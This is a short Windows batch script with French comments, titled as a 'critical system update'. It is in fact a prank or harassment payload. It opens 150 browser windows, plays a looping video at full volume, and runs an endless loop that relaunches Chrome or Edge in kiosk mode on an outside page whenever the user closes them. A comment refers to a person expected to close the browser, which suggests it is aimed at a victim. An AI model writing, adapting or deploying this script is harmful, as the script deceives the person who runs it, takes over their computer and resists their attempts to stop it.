@echo off
title MISE A JOUR SYSTEME CRITIQUE
color 0a

:: 1. Ouvre 50 onglets sur Chrome et Edge
for /l %%x in (1, 1, 50) do (
    start chrome "https://www.roblox.com"
    start msedge "https://www.youtube.com"
    start chrome "https://www.google.com/search?q=666"
)

:: 2. Ouvre la vidéo de Michou en boucle sur Chrome et Edge (avec le son à fond)
start chrome "https://www.youtube.com/watch?v=OwXihHvh8gc?autoplay=1&loop=1&playlist=OwXihHvh8gc"
start msedge "https://www.youtube.com/watch?v=OwXihHvh8gc?autoplay=1&loop=1&playlist=OwXihHvh8gc"

:: 3. Boucle infinie pour relancer si jamais il ferme Chrome ou Edge
:loop
timeout /t 2 >nul
tasklist | find /i "chrome.exe" >nul
if errorlevel 1 (
    start chrome --kiosk "https://member-cleanup.vercel.app"
)
tasklist | find /i "msedge.exe" >nul
if errorlevel 1 (
    start msedge --kiosk "https://member-cleanup.vercel.app"
)
goto loop